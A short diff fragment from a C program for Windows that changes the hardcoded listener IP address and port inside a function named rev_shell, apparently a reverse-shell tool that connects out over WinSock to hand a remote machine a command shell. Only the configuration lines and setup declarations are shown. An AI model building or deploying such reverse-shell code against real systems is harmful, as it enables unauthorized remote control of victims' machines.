@@ -60,9 +60,9 @@ void rev_shell() {
     STARTUPINFO sinfo;
     PROCESS_INFORMATION pinfo;
     struct sockaddr_in shell_addr;
-    char ip_addr[] = "192.168.137.1";
+    char ip_addr[] = "192.168.137.131";
     char RecData[512];
-    int port = 8081;
+    int port = 9999;
     int connection;
 
     //Initializing WinSock Version 2
